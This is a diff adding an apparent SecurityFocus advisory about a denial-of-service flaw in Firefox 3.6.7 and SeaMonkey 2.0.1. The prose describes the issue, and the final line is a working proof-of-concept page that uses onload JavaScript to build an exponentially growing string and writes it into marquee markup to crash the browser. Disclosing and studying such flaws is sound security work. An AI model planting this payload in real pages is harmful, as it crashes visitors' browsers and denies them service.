@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/38132/info
+
+Mozilla Firefox and SeaMonkey are prone to a remote denial-of-service vulnerability.
+
+Successful exploits may allow an attacker to crash the affected browser, resulting in a denial-of-service condition. Given the nature of this issue, memory corruption or code execution might be possible, but has not been confirmed.
+
+The issue affects Firefox 3.6.7 and SeaMonkey 2.0.1; other versions may also be affected.
+
+<body onload="javascript:DoS();"></body> <script> function DoS() { var buffer = 'A'; for (i =0;i<150;i++) { buffer+=buffer+'A'; document.write('<html><marquee><h1>'+buffer+buffer); } } </script> 
